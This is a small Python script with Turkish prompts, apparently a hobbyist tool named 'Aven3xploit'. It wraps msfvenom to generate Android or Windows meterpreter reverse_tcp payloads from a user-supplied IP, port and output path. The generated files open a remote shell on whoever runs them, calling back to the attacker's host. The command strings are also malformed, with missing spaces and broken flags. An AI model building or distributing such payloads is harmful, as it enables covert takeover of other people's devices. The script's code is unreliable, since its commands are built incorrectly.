import os

os.system("apt install figlet")
os.system("figlet Aven3xploit")

os.system("figlet IP")
ip = input("Local veya Dış IP Gir: ")

os.system("figlet PORT")
port = input("Portunuz : ")


os.system("figlet Kayit Yeri")
kytyrı = input("Kayıt Edilecek Dosya Yolu : ")

giris8 = """
===================
[1] Android Exploit  <===
[2] Windows Exploit  <===
===================
      """
print(giris8)

os.system("figlet 3xploit")
apk = input("Exploit'in Adını Giriniz : ")
payload = input("Numara Seç : ")

if payload == '1':
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + "LPORT=" + port + "-f -o" + kytyrı + "R >" + apk)
    
if payload == '2':
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + "LPORT=" + port + "-f exe" + kytyrı)

#================================
#Superman Tarafından Yapılmıştır.
#Aven William
#================================
